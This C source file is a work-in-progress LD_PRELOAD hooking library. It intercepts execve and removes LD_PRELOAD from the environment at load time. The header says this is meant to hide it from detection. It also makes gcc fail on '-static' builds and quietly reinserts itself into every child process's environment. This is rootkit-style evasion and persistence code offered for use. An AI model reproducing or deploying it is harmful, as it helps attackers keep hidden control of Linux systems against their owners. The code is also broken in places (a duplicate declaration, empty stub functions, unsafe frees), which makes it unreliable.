#define _GNU_SOURCE
/*
*@@@ landy @@@
*Hooks execve and breaks static compiling. So far has basic features
*that will hide from detection methods.
*Also tries to hook some other system calls that may be used in place of execve
*
*gcc -o h00kExec.so -shared -fpic -ldl -Wl,-init,init h00kExec.c
*
*/
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <errno.h>

//grabs the env variables at linking time(?)
extern char **environ;

//sets the old functions for use later
int (*old_execve)(const char *filename, char *const argv[], char *const envp[]);
int (*old_execve)(int dirfd, const char *pathname, char *const argv[], char *const envp[], int flags);
int (*old_fexecve)(int fd, char *const argv[], char *const envp[]);



char *mypreload;

//used to remove LD_PRELOAD when the library is loaded. We will load it back in 
//at the end.
void init(){
	char ldvar[] = "LD_PRELOAD";

	int ldlength = strlen(getenv(ldvar));
	mypreload = malloc(ldlength + 1);
	
	//remove LD_PRELOAD from the enviorment variables
	for(int i = 0; environ[i] != NULL; i++){
	    if(strstr(environ[i],ldvar)){
		strcpy(mypreload,environ[i]);

		for(int j = 0; environ[i][j] != '\0'; j++){
		   //this may not work *sigh*
		   environ[i][j] = '\0';
		}
		free(environ[i]);

	}
    }
 }
int execve(const char *filename, char *const argv[], char *const envp[]){

	char deflt[] = "LD_PRELOAD=";
	char **newenvp;
	int ldpos = 0;
	int x, y;

	if(!old_execve){
		old_execve = dlsym(RTLD_NEXT,"execve");		
	}
	
	//breaks static compiling
	if(strstr(filename, "gcc")){
		for(int i =0; argv[i] != NULL; i++){
			if(strstr(argv[i],"-static")){
				errno = EIO;
				return -1;
			}
		}
	}

	//need to grab the size of the env vars
	for(x = 0; envp[x] != NULL; x++){
		if(strstr(envp[x], deflt)){
			ldpos = x;
		}
	}

	//lets load LD_PRELOAD back in :)
	newenvp = (char**)malloc((x+2)*sizeof(char*));

	if(ldpos == 0){
		newenvp[x+1] = malloc(256);
		strcpy(newenvp[x+1],mypreload);		
	}else{
	    newenvp[ldpos] = malloc(256);
	    strcpy(newenvp[ldpos],mypreload);
	}

	for(y = 0;y < x; y++){
		//wanky ass logic that sucks ass
		if(ldpos != 0){
		    if(y == ldpos) continue;
		}

		//load back LD_PRELOAD into the right spot
		newenvp[y] = malloc(256);
		strcpy(newenvp[y],envp[y]);

	}

	return old_execve(filename, argv, newenvp);
}

int execveat(int dirfd, const char *pathname, char *const argv[], char *const envp[], int flags){
    //TODO
}

int fexecve(fd, char *const argv[], char *const envp[]){
    //TODO
}
